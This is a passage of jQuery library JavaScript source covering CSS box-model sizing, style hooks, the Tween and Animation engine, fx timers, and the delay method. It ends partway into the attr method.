cssShow = { position: "absolute", visibility: "hidden", display: "block" },
cssNormalTransform = {
    letterSpacing: "0",
    fontWeight: "400"
};

function setPositiveNumber( _elem, value, subtract ) {

// Any relative (+/-) values have already been
// normalized at this point
var matches = rcssNum.exec( value );
return matches ?

    // Guard against undefined "subtract", e.g., when used as in cssHooks
    Math.max( 0, matches[ 2 ] - ( subtract || 0 ) ) + ( matches[ 3 ] || "px" ) :
    value;
}

function boxModelAdjustment( elem, dimension, box, isBorderBox, styles, computedVal ) {
var i = dimension === "width" ? 1 : 0,
    extra = 0,
    delta = 0;

// Adjustment may not be necessary
if ( box === ( isBorderBox ? "border" : "content" ) ) {
    return 0;
}

for ( ; i < 4; i += 2 ) {

    // Both box models exclude margin
    if ( box === "margin" ) {
        delta += jQuery.css( elem, box + cssExpand[ i ], true, styles );
    }

    // If we get here with a content-box, we're seeking "padding" or "border" or "margin"
    if ( !isBorderBox ) {

        // Add padding
        delta += jQuery.css( elem, "padding" + cssExpand[ i ], true, styles );

        // For "border" or "margin", add border
        if ( box !== "padding" ) {
            delta += jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );

        // But still keep track of it otherwise
        } else {
            extra += jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );
        }

    // If we get here with a border-box (content + padding + border), we're seeking "content" or
    // "padding" or "margin"
    } else {

        // For "content", subtract padding
        if ( box === "content" ) {
            delta -= jQuery.css( elem, "padding" + cssExpand[ i ], true, styles );
        }

        // For "content" or "padding", subtract border
        if ( box !== "margin" ) {
            delta -= jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );
        }
    }
}

// Account for positive content-box scroll gutter when requested by providing computedVal
if ( !isBorderBox && computedVal >= 0 ) {

    // offsetWidth/offsetHeight is a rounded sum of content, padding, scroll gutter, and border
    // Assuming integer scroll gutter, subtract the rest and round down
    delta += Math.max( 0, Math.ceil(
        elem[ "offset" + dimension[ 0 ].toUpperCase() + dimension.slice( 1 ) ] -
        computedVal -
        delta -
        extra -
        0.5

    // If offsetWidth/offsetHeight is unknown, then we can't determine content-box scroll gutter
    // Use an explicit zero to avoid NaN (gh-3964)
    ) ) || 0;
}

return delta;
}

function getWidthOrHeight( elem, dimension, extra ) {

// Start with computed style
var styles = getStyles( elem ),

    // To avoid forcing a reflow, only fetch boxSizing if we need it (gh-4322).
    // Fake content-box until we know it's needed to know the true value.
    boxSizingNeeded = !support.boxSizingReliable() || extra,
    isBorderBox = boxSizingNeeded &&
        jQuery.css( elem, "boxSizing", false, styles ) === "border-box",
    valueIsBorderBox = isBorderBox,

    val = curCSS( elem, dimension, styles ),
    offsetProp = "offset" + dimension[ 0 ].toUpperCase() + dimension.slice( 1 );

// Support: Firefox <=54
// Return a confounding non-pixel value or feign ignorance, as appropriate.
if ( rnumnonpx.test( val ) ) {
    if ( !extra ) {
        return val;
    }
    val = "auto";
}


// Support: IE 9 - 11 only
// Use offsetWidth/offsetHeight for when box sizing is unreliable.
// In those cases, the computed value can be trusted to be border-box.
if ( ( !support.boxSizingReliable() && isBorderBox ||

    // Support: IE 10 - 11+, Edge 15 - 18+
    // IE/Edge misreport `getComputedStyle` of table rows with width/height
    // set in CSS while `offset*` properties report correct values.
    // Interestingly, in some cases IE 9 doesn't suffer from this issue.
    !support.reliableTrDimensions() && nodeName( elem, "tr" ) ||

    // Fall back to offsetWidth/offsetHeight when value is "auto"
    // This happens for inline elements with no explicit setting (gh-3571)
    val === "auto" ||

    // Support: Android <=4.1 - 4.3 only
    // Also use offsetWidth/offsetHeight for misreported inline dimensions (gh-3602)
    !parseFloat( val ) && jQuery.css( elem, "display", false, styles ) === "inline" ) &&

    // Make sure the element is visible & connected
    elem.getClientRects().length ) {

    isBorderBox = jQuery.css( elem, "boxSizing", false, styles ) === "border-box";

    // Where available, offsetWidth/offsetHeight approximate border box dimensions.
    // Where not available (e.g., SVG), assume unreliable box-sizing and interpret the
    // retrieved value as a content box dimension.
    valueIsBorderBox = offsetProp in elem;
    if ( valueIsBorderBox ) {
        val = elem[ offsetProp ];
    }
}

// Normalize "" and auto
val = parseFloat( val ) || 0;

// Adjust for the element's box model
return ( val +
    boxModelAdjustment(
        elem,
        dimension,
        extra || ( isBorderBox ? "border" : "content" ),
        valueIsBorderBox,
        styles,

        // Provide the current computed size to request scroll gutter calculation (gh-3589)
        val
    )
) + "px";
}

jQuery.extend( {

// Add in style property hooks for overriding the default
// behavior of getting and setting a style property
cssHooks: {
    opacity: {
        get: function( elem, computed ) {
            if ( computed ) {

                // We should always get a number back from opacity
                var ret = curCSS( elem, "opacity" );
                return ret === "" ? "1" : ret;
            }
        }
    }
},

// Don't automatically add "px" to these possibly-unitless properties
cssNumber: {
    "animationIterationCount": true,
    "columnCount": true,
    "fillOpacity": true,
    "flexGrow": true,
    "flexShrink": true,
    "fontWeight": true,
    "gridArea": true,
    "gridColumn": true,
    "gridColumnEnd": true,
    "gridColumnStart": true,
    "gridRow": true,
    "gridRowEnd": true,
    "gridRowStart": true,
    "lineHeight": true,
    "opacity": true,
    "order": true,
    "orphans": true,
    "widows": true,
    "zIndex": true,
    "zoom": true
},

// Add in properties whose names you wish to fix before
// setting or getting the value
cssProps: {},

// Get and set the style property on a DOM Node
style: function( elem, name, value, extra ) {

    // Don't set styles on text and comment nodes
    if ( !elem || elem.nodeType === 3 || elem.nodeType === 8 || !elem.style ) {
        return;
    }

    // Make sure that we're working with the right name
    var ret, type, hooks,
        origName = camelCase( name ),
        isCustomProp = rcustomProp.test( name ),
        style = elem.style;

    // Make sure that we're working with the right name. We don't
    // want to query the value if it is a CSS custom property
    // since they are user-defined.
    if ( !isCustomProp ) {
        name = finalPropName( origName );
    }

    // Gets hook for the prefixed version, then unprefixed version
    hooks = jQuery.cssHooks[ name ] || jQuery.cssHooks[ origName ];

    // Check if we're setting a value
    if ( value !== undefined ) {
        type = typeof value;

        // Convert "+=" or "-=" to relative numbers (#7345)
        if ( type === "string" && ( ret = rcssNum.exec( value ) ) && ret[ 1 ] ) {
            value = adjustCSS( elem, name, ret );

            // Fixes bug #9237
            type = "number";
        }

        // Make sure that null and NaN values aren't set (#7116)
        if ( value == null || value !== value ) {
            return;
        }

        // If a number was passed in, add the unit (except for certain CSS properties)
        // The isCustomProp check can be removed in jQuery 4.0 when we only auto-append
        // "px" to a few hardcoded values.
        if ( type === "number" && !isCustomProp ) {
            value += ret && ret[ 3 ] || ( jQuery.cssNumber[ origName ] ? "" : "px" );
        }

        // background-* props affect original clone's values
        if ( !support.clearCloneStyle && value === "" && name.indexOf( "background" ) === 0 ) {
            style[ name ] = "inherit";
        }

        // If a hook was provided, use that value, otherwise just set the specified value
        if ( !hooks || !( "set" in hooks ) ||
            ( value = hooks.set( elem, value, extra ) ) !== undefined ) {

            if ( isCustomProp ) {
                style.setProperty( name, value );
            } else {
                style[ name ] = value;
            }
        }

    } else {

        // If a hook was provided get the non-computed value from there
        if ( hooks && "get" in hooks &&
            ( ret = hooks.get( elem, false, extra ) ) !== undefined ) {

            return ret;
        }

        // Otherwise just get the value from the style object
        return style[ name ];
    }
},

css: function( elem, name, extra, styles ) {
    var val, num, hooks,
        origName = camelCase( name ),
        isCustomProp = rcustomProp.test( name );

    // Make sure that we're working with the right name. We don't
    // want to modify the value if it is a CSS custom property
    // since they are user-defined.
    if ( !isCustomProp ) {
        name = finalPropName( origName );
    }

    // Try prefixed name followed by the unprefixed name
    hooks = jQuery.cssHooks[ name ] || jQuery.cssHooks[ origName ];

    // If a hook was provided get the computed value from there
    if ( hooks && "get" in hooks ) {
        val = hooks.get( elem, true, extra );
    }

    // Otherwise, if a way to get the computed value exists, use that
    if ( val === undefined ) {
        val = curCSS( elem, name, styles );
    }

    // Convert "normal" to computed value
    if ( val === "normal" && name in cssNormalTransform ) {
        val = cssNormalTransform[ name ];
    }

    // Make numeric if forced or a qualifier was provided and val looks numeric
    if ( extra === "" || extra ) {
        num = parseFloat( val );
        return extra === true || isFinite( num ) ? num || 0 : val;
    }

    return val;
}
} );

jQuery.each( [ "height", "width" ], function( _i, dimension ) {
jQuery.cssHooks[ dimension ] = {
    get: function( elem, computed, extra ) {
        if ( computed ) {

            // Certain elements can have dimension info if we invisibly show them
            // but it must have a current display style that would benefit
            return rdisplayswap.test( jQuery.css( elem, "display" ) ) &&

                // Support: Safari 8+
                // Table columns in Safari have non-zero offsetWidth & zero
                // getBoundingClientRect().width unless display is changed.
                // Support: IE <=11 only
                // Running getBoundingClientRect on a disconnected node
                // in IE throws an error.
                ( !elem.getClientRects().length || !elem.getBoundingClientRect().width ) ?
                swap( elem, cssShow, function() {
                    return getWidthOrHeight( elem, dimension, extra );
                } ) :
                getWidthOrHeight( elem, dimension, extra );
        }
    },

    set: function( elem, value, extra ) {
        var matches,
            styles = getStyles( elem ),

            // Only read styles.position if the test has a chance to fail
            // to avoid forcing a reflow.
            scrollboxSizeBuggy = !support.scrollboxSize() &&
                styles.position === "absolute",

            // To avoid forcing a reflow, only fetch boxSizing if we need it (gh-3991)
            boxSizingNeeded = scrollboxSizeBuggy || extra,
            isBorderBox = boxSizingNeeded &&
                jQuery.css( elem, "boxSizing", false, styles ) === "border-box",
            subtract = extra ?
                boxModelAdjustment(
                    elem,
                    dimension,
                    extra,
                    isBorderBox,
                    styles
                ) :
                0;

        // Account for unreliable border-box dimensions by comparing offset* to computed and
        // faking a content-box to get border and padding (gh-3699)
        if ( isBorderBox && scrollboxSizeBuggy ) {
            subtract -= Math.ceil(
                elem[ "offset" + dimension[ 0 ].toUpperCase() + dimension.slice( 1 ) ] -
                parseFloat( styles[ dimension ] ) -
                boxModelAdjustment( elem, dimension, "border", false, styles ) -
                0.5
            );
        }

        // Convert to pixels if value adjustment is needed
        if ( subtract && ( matches = rcssNum.exec( value ) ) &&
            ( matches[ 3 ] || "px" ) !== "px" ) {

            elem.style[ dimension ] = value;
            value = jQuery.css( elem, dimension );
        }

        return setPositiveNumber( elem, value, subtract );
    }
};
} );

jQuery.cssHooks.marginLeft = addGetHookIf( support.reliableMarginLeft,
function( elem, computed ) {
    if ( computed ) {
        return ( parseFloat( curCSS( elem, "marginLeft" ) ) ||
            elem.getBoundingClientRect().left -
                swap( elem, { marginLeft: 0 }, function() {
                    return elem.getBoundingClientRect().left;
                } )
        ) + "px";
    }
}
);

// These hooks are used by animate to expand properties
jQuery.each( {
margin: "",
padding: "",
border: "Width"
}, function( prefix, suffix ) {
jQuery.cssHooks[ prefix + suffix ] = {
    expand: function( value ) {
        var i = 0,
            expanded = {},

            // Assumes a single number if not a string
            parts = typeof value === "string" ? value.split( " " ) : [ value ];

        for ( ; i < 4; i++ ) {
            expanded[ prefix + cssExpand[ i ] + suffix ] =
                parts[ i ] || parts[ i - 2 ] || parts[ 0 ];
        }

        return expanded;
    }
};

if ( prefix !== "margin" ) {
    jQuery.cssHooks[ prefix + suffix ].set = setPositiveNumber;
}
} );

jQuery.fn.extend( {
css: function( name, value ) {
    return access( this, function( elem, name, value ) {
        var styles, len,
            map = {},
            i = 0;

        if ( Array.isArray( name ) ) {
            styles = getStyles( elem );
            len = name.length;

            for ( ; i < len; i++ ) {
                map[ name[ i ] ] = jQuery.css( elem, name[ i ], false, styles );
            }

            return map;
        }

        return value !== undefined ?
            jQuery.style( elem, name, value ) :
            jQuery.css( elem, name );
    }, name, value, arguments.length > 1 );
}
} );


function Tween( elem, options, prop, end, easing ) {
return new Tween.prototype.init( elem, options, prop, end, easing );
}
jQuery.Tween = Tween;

Tween.prototype = {
constructor: Tween,
init: function( elem, options, prop, end, easing, unit ) {
    this.elem = elem;
    this.prop = prop;
    this.easing = easing || jQuery.easing._default;
    this.options = options;
    this.start = this.now = this.cur();
    this.end = end;
    this.unit = unit || ( jQuery.cssNumber[ prop ] ? "" : "px" );
},
cur: function() {
    var hooks = Tween.propHooks[ this.prop ];

    return hooks && hooks.get ?
        hooks.get( this ) :
        Tween.propHooks._default.get( this );
},
run: function( percent ) {
    var eased,
        hooks = Tween.propHooks[ this.prop ];

    if ( this.options.duration ) {
        this.pos = eased = jQuery.easing[ this.easing ](
            percent, this.options.duration * percent, 0, 1, this.options.duration
        );
    } else {
        this.pos = eased = percent;
    }
    this.now = ( this.end - this.start ) * eased + this.start;

    if ( this.options.step ) {
        this.options.step.call( this.elem, this.now, this );
    }

    if ( hooks && hooks.set ) {
        hooks.set( this );
    } else {
        Tween.propHooks._default.set( this );
    }
    return this;
}
};

Tween.prototype.init.prototype = Tween.prototype;

Tween.propHooks = {
_default: {
    get: function( tween ) {
        var result;

        // Use a property on the element directly when it is not a DOM element,
        // or when there is no matching style property that exists.
        if ( tween.elem.nodeType !== 1 ||
            tween.elem[ tween.prop ] != null && tween.elem.style[ tween.prop ] == null ) {
            return tween.elem[ tween.prop ];
        }

        // Passing an empty string as a 3rd parameter to .css will automatically
        // attempt a parseFloat and fallback to a string if the parse fails.
        // Simple values such as "10px" are parsed to Float;
        // complex values such as "rotate(1rad)" are returned as-is.
        result = jQuery.css( tween.elem, tween.prop, "" );

        // Empty strings, null, undefined and "auto" are converted to 0.
        return !result || result === "auto" ? 0 : result;
    },
    set: function( tween ) {

        // Use step hook for back compat.
        // Use cssHook if its there.
        // Use .style if available and use plain properties where available.
        if ( jQuery.fx.step[ tween.prop ] ) {
            jQuery.fx.step[ tween.prop ]( tween );
        } else if ( tween.elem.nodeType === 1 && (
            jQuery.cssHooks[ tween.prop ] ||
                tween.elem.style[ finalPropName( tween.prop ) ] != null ) ) {
            jQuery.style( tween.elem, tween.prop, tween.now + tween.unit );
        } else {
            tween.elem[ tween.prop ] = tween.now;
        }
    }
}
};

// Support: IE <=9 only
// Panic based approach to setting things on disconnected nodes
Tween.propHooks.scrollTop = Tween.propHooks.scrollLeft = {
set: function( tween ) {
    if ( tween.elem.nodeType && tween.elem.parentNode ) {
        tween.elem[ tween.prop ] = tween.now;
    }
}
};

jQuery.easing = {
linear: function( p ) {
    return p;
},
swing: function( p ) {
    return 0.5 - Math.cos( p * Math.PI ) / 2;
},
_default: "swing"
};

jQuery.fx = Tween.prototype.init;

// Back compat <1.8 extension point
jQuery.fx.step = {};




var
fxNow, inProgress,
rfxtypes = /^(?:toggle|show|hide)$/,
rrun = /queueHooks$/;

function schedule() {
if ( inProgress ) {
    if ( document.hidden === false && window.requestAnimationFrame ) {
        window.requestAnimationFrame( schedule );
    } else {
        window.setTimeout( schedule, jQuery.fx.interval );
    }

    jQuery.fx.tick();
}
}

// Animations created synchronously will run synchronously
function createFxNow() {
window.setTimeout( function() {
    fxNow = undefined;
} );
return ( fxNow = Date.now() );
}

// Generate parameters to create a standard animation
function genFx( type, includeWidth ) {
var which,
    i = 0,
    attrs = { height: type };

// If we include width, step value is 1 to do all cssExpand values,
// otherwise step value is 2 to skip over Left and Right
includeWidth = includeWidth ? 1 : 0;
for ( ; i < 4; i += 2 - includeWidth ) {
    which = cssExpand[ i ];
    attrs[ "margin" + which ] = attrs[ "padding" + which ] = type;
}

if ( includeWidth ) {
    attrs.opacity = attrs.width = type;
}

return attrs;
}

function createTween( value, prop, animation ) {
var tween,
    collection = ( Animation.tweeners[ prop ] || [] ).concat( Animation.tweeners[ "*" ] ),
    index = 0,
    length = collection.length;
for ( ; index < length; index++ ) {
    if ( ( tween = collection[ index ].call( animation, prop, value ) ) ) {

        // We're done with this property
        return tween;
    }
}
}

function defaultPrefilter( elem, props, opts ) {
var prop, value, toggle, hooks, oldfire, propTween, restoreDisplay, display,
    isBox = "width" in props || "height" in props,
    anim = this,
    orig = {},
    style = elem.style,
    hidden = elem.nodeType && isHiddenWithinTree( elem ),
    dataShow = dataPriv.get( elem, "fxshow" );

// Queue-skipping animations hijack the fx hooks
if ( !opts.queue ) {
    hooks = jQuery._queueHooks( elem, "fx" );
    if ( hooks.unqueued == null ) {
        hooks.unqueued = 0;
        oldfire = hooks.empty.fire;
        hooks.empty.fire = function() {
            if ( !hooks.unqueued ) {
                oldfire();
            }
        };
    }
    hooks.unqueued++;

    anim.always( function() {

        // Ensure the complete handler is called before this completes
        anim.always( function() {
            hooks.unqueued--;
            if ( !jQuery.queue( elem, "fx" ).length ) {
                hooks.empty.fire();
            }
        } );
    } );
}

// Detect show/hide animations
for ( prop in props ) {
    value = props[ prop ];
    if ( rfxtypes.test( value ) ) {
        delete props[ prop ];
        toggle = toggle || value === "toggle";
        if ( value === ( hidden ? "hide" : "show" ) ) {

            // Pretend to be hidden if this is a "show" and
            // there is still data from a stopped show/hide
            if ( value === "show" && dataShow && dataShow[ prop ] !== undefined ) {
                hidden = true;

            // Ignore all other no-op show/hide data
            } else {
                continue;
            }
        }
        orig[ prop ] = dataShow && dataShow[ prop ] || jQuery.style( elem, prop );
    }
}

// Bail out if this is a no-op like .hide().hide()
propTween = !jQuery.isEmptyObject( props );
if ( !propTween && jQuery.isEmptyObject( orig ) ) {
    return;
}

// Restrict "overflow" and "display" styles during box animations
if ( isBox && elem.nodeType === 1 ) {

    // Support: IE <=9 - 11, Edge 12 - 15
    // Record all 3 overflow attributes because IE does not infer the shorthand
    // from identically-valued overflowX and overflowY and Edge just mirrors
    // the overflowX value there.
    opts.overflow = [ style.overflow, style.overflowX, style.overflowY ];

    // Identify a display type, preferring old show/hide data over the CSS cascade
    restoreDisplay = dataShow && dataShow.display;
    if ( restoreDisplay == null ) {
        restoreDisplay = dataPriv.get( elem, "display" );
    }
    display = jQuery.css( elem, "display" );
    if ( display === "none" ) {
        if ( restoreDisplay ) {
            display = restoreDisplay;
        } else {

            // Get nonempty value(s) by temporarily forcing visibility
            showHide( [ elem ], true );
            restoreDisplay = elem.style.display || restoreDisplay;
            display = jQuery.css( elem, "display" );
            showHide( [ elem ] );
        }
    }

    // Animate inline elements as inline-block
    if ( display === "inline" || display === "inline-block" && restoreDisplay != null ) {
        if ( jQuery.css( elem, "float" ) === "none" ) {

            // Restore the original display value at the end of pure show/hide animations
            if ( !propTween ) {
                anim.done( function() {
                    style.display = restoreDisplay;
                } );
                if ( restoreDisplay == null ) {
                    display = style.display;
                    restoreDisplay = display === "none" ? "" : display;
                }
            }
            style.display = "inline-block";
        }
    }
}

if ( opts.overflow ) {
    style.overflow = "hidden";
    anim.always( function() {
        style.overflow = opts.overflow[ 0 ];
        style.overflowX = opts.overflow[ 1 ];
        style.overflowY = opts.overflow[ 2 ];
    } );
}

// Implement show/hide animations
propTween = false;
for ( prop in orig ) {

    // General show/hide setup for this element animation
    if ( !propTween ) {
        if ( dataShow ) {
            if ( "hidden" in dataShow ) {
                hidden = dataShow.hidden;
            }
        } else {
            dataShow = dataPriv.access( elem, "fxshow", { display: restoreDisplay } );
        }

        // Store hidden/visible for toggle so `.stop().toggle()` "reverses"
        if ( toggle ) {
            dataShow.hidden = !hidden;
        }

        // Show elements before animating them
        if ( hidden ) {
            showHide( [ elem ], true );
        }

        /* eslint-disable no-loop-func */

        anim.done( function() {

            /* eslint-enable no-loop-func */

            // The final step of a "hide" animation is actually hiding the element
            if ( !hidden ) {
                showHide( [ elem ] );
            }
            dataPriv.remove( elem, "fxshow" );
            for ( prop in orig ) {
                jQuery.style( elem, prop, orig[ prop ] );
            }
        } );
    }

    // Per-property setup
    propTween = createTween( hidden ? dataShow[ prop ] : 0, prop, anim );
    if ( !( prop in dataShow ) ) {
        dataShow[ prop ] = propTween.start;
        if ( hidden ) {
            propTween.end = propTween.start;
            propTween.start = 0;
        }
    }
}
}

function propFilter( props, specialEasing ) {
var index, name, easing, value, hooks;

// camelCase, specialEasing and expand cssHook pass
for ( index in props ) {
    name = camelCase( index );
    easing = specialEasing[ name ];
    value = props[ index ];
    if ( Array.isArray( value ) ) {
        easing = value[ 1 ];
        value = props[ index ] = value[ 0 ];
    }

    if ( index !== name ) {
        props[ name ] = value;
        delete props[ index ];
    }

    hooks = jQuery.cssHooks[ name ];
    if ( hooks && "expand" in hooks ) {
        value = hooks.expand( value );
        delete props[ name ];

        // Not quite $.extend, this won't overwrite existing keys.
        // Reusing 'index' because we have the correct "name"
        for ( index in value ) {
            if ( !( index in props ) ) {
                props[ index ] = value[ index ];
                specialEasing[ index ] = easing;
            }
        }
    } else {
        specialEasing[ name ] = easing;
    }
}
}

function Animation( elem, properties, options ) {
var result,
    stopped,
    index = 0,
    length = Animation.prefilters.length,
    deferred = jQuery.Deferred().always( function() {

        // Don't match elem in the :animated selector
        delete tick.elem;
    } ),
    tick = function() {
        if ( stopped ) {
            return false;
        }
        var currentTime = fxNow || createFxNow(),
            remaining = Math.max( 0, animation.startTime + animation.duration - currentTime ),

            // Support: Android 2.3 only
            // Archaic crash bug won't allow us to use `1 - ( 0.5 || 0 )` (#12497)
            temp = remaining / animation.duration || 0,
            percent = 1 - temp,
            index = 0,
            length = animation.tweens.length;

        for ( ; index < length; index++ ) {
            animation.tweens[ index ].run( percent );
        }

        deferred.notifyWith( elem, [ animation, percent, remaining ] );

        // If there's more to do, yield
        if ( percent < 1 && length ) {
            return remaining;
        }

        // If this was an empty animation, synthesize a final progress notification
        if ( !length ) {
            deferred.notifyWith( elem, [ animation, 1, 0 ] );
        }

        // Resolve the animation and report its conclusion
        deferred.resolveWith( elem, [ animation ] );
        return false;
    },
    animation = deferred.promise( {
        elem: elem,
        props: jQuery.extend( {}, properties ),
        opts: jQuery.extend( true, {
            specialEasing: {},
            easing: jQuery.easing._default
        }, options ),
        originalProperties: properties,
        originalOptions: options,
        startTime: fxNow || createFxNow(),
        duration: options.duration,
        tweens: [],
        createTween: function( prop, end ) {
            var tween = jQuery.Tween( elem, animation.opts, prop, end,
                animation.opts.specialEasing[ prop ] || animation.opts.easing );
            animation.tweens.push( tween );
            return tween;
        },
        stop: function( gotoEnd ) {
            var index = 0,

                // If we are going to the end, we want to run all the tweens
                // otherwise we skip this part
                length = gotoEnd ? animation.tweens.length : 0;
            if ( stopped ) {
                return this;
            }
            stopped = true;
            for ( ; index < length; index++ ) {
                animation.tweens[ index ].run( 1 );
            }

            // Resolve when we played the last frame; otherwise, reject
            if ( gotoEnd ) {
                deferred.notifyWith( elem, [ animation, 1, 0 ] );
                deferred.resolveWith( elem, [ animation, gotoEnd ] );
            } else {
                deferred.rejectWith( elem, [ animation, gotoEnd ] );
            }
            return this;
        }
    } ),
    props = animation.props;

propFilter( props, animation.opts.specialEasing );

for ( ; index < length; index++ ) {
    result = Animation.prefilters[ index ].call( animation, elem, props, animation.opts );
    if ( result ) {
        if ( isFunction( result.stop ) ) {
            jQuery._queueHooks( animation.elem, animation.opts.queue ).stop =
                result.stop.bind( result );
        }
        return result;
    }
}

jQuery.map( props, createTween, animation );

if ( isFunction( animation.opts.start ) ) {
    animation.opts.start.call( elem, animation );
}

// Attach callbacks from options
animation
    .progress( animation.opts.progress )
    .done( animation.opts.done, animation.opts.complete )
    .fail( animation.opts.fail )
    .always( animation.opts.always );

jQuery.fx.timer(
    jQuery.extend( tick, {
        elem: elem,
        anim: animation,
        queue: animation.opts.queue
    } )
);

return animation;
}

jQuery.Animation = jQuery.extend( Animation, {

tweeners: {
    "*": [ function( prop, value ) {
        var tween = this.createTween( prop, value );
        adjustCSS( tween.elem, prop, rcssNum.exec( value ), tween );
        return tween;
    } ]
},

tweener: function( props, callback ) {
    if ( isFunction( props ) ) {
        callback = props;
        props = [ "*" ];
    } else {
        props = props.match( rnothtmlwhite );
    }

    var prop,
        index = 0,
        length = props.length;

    for ( ; index < length; index++ ) {
        prop = props[ index ];
        Animation.tweeners[ prop ] = Animation.tweeners[ prop ] || [];
        Animation.tweeners[ prop ].unshift( callback );
    }
},

prefilters: [ defaultPrefilter ],

prefilter: function( callback, prepend ) {
    if ( prepend ) {
        Animation.prefilters.unshift( callback );
    } else {
        Animation.prefilters.push( callback );
    }
}
} );

jQuery.speed = function( speed, easing, fn ) {
var opt = speed && typeof speed === "object" ? jQuery.extend( {}, speed ) : {
    complete: fn || !fn && easing ||
        isFunction( speed ) && speed,
    duration: speed,
    easing: fn && easing || easing && !isFunction( easing ) && easing
};

// Go to the end state if fx are off
if ( jQuery.fx.off ) {
    opt.duration = 0;

} else {
    if ( typeof opt.duration !== "number" ) {
        if ( opt.duration in jQuery.fx.speeds ) {
            opt.duration = jQuery.fx.speeds[ opt.duration ];

        } else {
            opt.duration = jQuery.fx.speeds._default;
        }
    }
}

// Normalize opt.queue - true/undefined/null -> "fx"
if ( opt.queue == null || opt.queue === true ) {
    opt.queue = "fx";
}

// Queueing
opt.old = opt.complete;

opt.complete = function() {
    if ( isFunction( opt.old ) ) {
        opt.old.call( this );
    }

    if ( opt.queue ) {
        jQuery.dequeue( this, opt.queue );
    }
};

return opt;
};

jQuery.fn.extend( {
fadeTo: function( speed, to, easing, callback ) {

    // Show any hidden elements after setting opacity to 0
    return this.filter( isHiddenWithinTree ).css( "opacity", 0 ).show()

        // Animate to the value specified
        .end().animate( { opacity: to }, speed, easing, callback );
},
animate: function( prop, speed, easing, callback ) {
    var empty = jQuery.isEmptyObject( prop ),
        optall = jQuery.speed( speed, easing, callback ),
        doAnimation = function() {

            // Operate on a copy of prop so per-property easing won't be lost
            var anim = Animation( this, jQuery.extend( {}, prop ), optall );

            // Empty animations, or finishing resolves immediately
            if ( empty || dataPriv.get( this, "finish" ) ) {
                anim.stop( true );
            }
        };

    doAnimation.finish = doAnimation;

    return empty || optall.queue === false ?
        this.each( doAnimation ) :
        this.queue( optall.queue, doAnimation );
},
stop: function( type, clearQueue, gotoEnd ) {
    var stopQueue = function( hooks ) {
        var stop = hooks.stop;
        delete hooks.stop;
        stop( gotoEnd );
    };

    if ( typeof type !== "string" ) {
        gotoEnd = clearQueue;
        clearQueue = type;
        type = undefined;
    }
    if ( clearQueue ) {
        this.queue( type || "fx", [] );
    }

    return this.each( function() {
        var dequeue = true,
            index = type != null && type + "queueHooks",
            timers = jQuery.timers,
            data = dataPriv.get( this );

        if ( index ) {
            if ( data[ index ] && data[ index ].stop ) {
                stopQueue( data[ index ] );
            }
        } else {
            for ( index in data ) {
                if ( data[ index ] && data[ index ].stop && rrun.test( index ) ) {
                    stopQueue( data[ index ] );
                }
            }
        }

        for ( index = timers.length; index--; ) {
            if ( timers[ index ].elem === this &&
                ( type == null || timers[ index ].queue === type ) ) {

                timers[ index ].anim.stop( gotoEnd );
                dequeue = false;
                timers.splice( index, 1 );
            }
        }

        // Start the next in the queue if the last step wasn't forced.
        // Timers currently will call their complete callbacks, which
        // will dequeue but only if they were gotoEnd.
        if ( dequeue || !gotoEnd ) {
            jQuery.dequeue( this, type );
        }
    } );
},
finish: function( type ) {
    if ( type !== false ) {
        type = type || "fx";
    }
    return this.each( function() {
        var index,
            data = dataPriv.get( this ),
            queue = data[ type + "queue" ],
            hooks = data[ type + "queueHooks" ],
            timers = jQuery.timers,
            length = queue ? queue.length : 0;

        // Enable finishing flag on private data
        data.finish = true;

        // Empty the queue first
        jQuery.queue( this, type, [] );

        if ( hooks && hooks.stop ) {
            hooks.stop.call( this, true );
        }

        // Look for any active animations, and finish them
        for ( index = timers.length; index--; ) {
            if ( timers[ index ].elem === this && timers[ index ].queue === type ) {
                timers[ index ].anim.stop( true );
                timers.splice( index, 1 );
            }
        }

        // Look for any animations in the old queue and finish them
        for ( index = 0; index < length; index++ ) {
            if ( queue[ index ] && queue[ index ].finish ) {
                queue[ index ].finish.call( this );
            }
        }

        // Turn off finishing flag
        delete data.finish;
    } );
}
} );

jQuery.each( [ "toggle", "show", "hide" ], function( _i, name ) {
var cssFn = jQuery.fn[ name ];
jQuery.fn[ name ] = function( speed, easing, callback ) {
    return speed == null || typeof speed === "boolean" ?
        cssFn.apply( this, arguments ) :
        this.animate( genFx( name, true ), speed, easing, callback );
};
} );

// Generate shortcuts for custom animations
jQuery.each( {
slideDown: genFx( "show" ),
slideUp: genFx( "hide" ),
slideToggle: genFx( "toggle" ),
fadeIn: { opacity: "show" },
fadeOut: { opacity: "hide" },
fadeToggle: { opacity: "toggle" }
}, function( name, props ) {
jQuery.fn[ name ] = function( speed, easing, callback ) {
    return this.animate( props, speed, easing, callback );
};
} );

jQuery.timers = [];
jQuery.fx.tick = function() {
var timer,
    i = 0,
    timers = jQuery.timers;

fxNow = Date.now();

for ( ; i < timers.length; i++ ) {
    timer = timers[ i ];

    // Run the timer and safely remove it when done (allowing for external removal)
    if ( !timer() && timers[ i ] === timer ) {
        timers.splice( i--, 1 );
    }
}

if ( !timers.length ) {
    jQuery.fx.stop();
}
fxNow = undefined;
};

jQuery.fx.timer = function( timer ) {
jQuery.timers.push( timer );
jQuery.fx.start();
};

jQuery.fx.interval = 13;
jQuery.fx.start = function() {
if ( inProgress ) {
    return;
}

inProgress = true;
schedule();
};

jQuery.fx.stop = function() {
inProgress = null;
};

jQuery.fx.speeds = {
slow: 600,
fast: 200,

// Default speed
_default: 400
};


// Based off of the plugin by Clint Helfers, with permission.
// https://web.archive.org/web/20100324014747/http://blindsignals.com/index.php/2009/07/jquery-delay/
jQuery.fn.delay = function( time, type ) {
time = jQuery.fx ? jQuery.fx.speeds[ time ] || time : time;
type = type || "fx";

return this.queue( type, function( next, hooks ) {
    var timeout = window.setTimeout( next, time );
    hooks.stop = function() {
        window.clearTimeout( timeout );
    };
} );
};


( function() {
var input = document.createElement( "input" ),
    select = document.createElement( "select" ),
    opt = select.appendChild( document.createElement( "option" ) );

input.type = "checkbox";

// Support: Android <=4.3 only
// Default value for a checkbox should be "on"
support.checkOn = input.value !== "";

// Support: IE <=11 only
// Must access selectedIndex to make default options select
support.optSelected = opt.selected;

// Support: IE <=11 only
// An input loses its value after becoming a radio
input = document.createElement( "input" );
input.value = "t";
input.type = "radio";
support.radioValue = input.value === "t";
} )();


var boolHook,
attrHandle = jQuery.expr.attrHandle;

jQuery.fn.extend( {
attr: function( name, value ) {
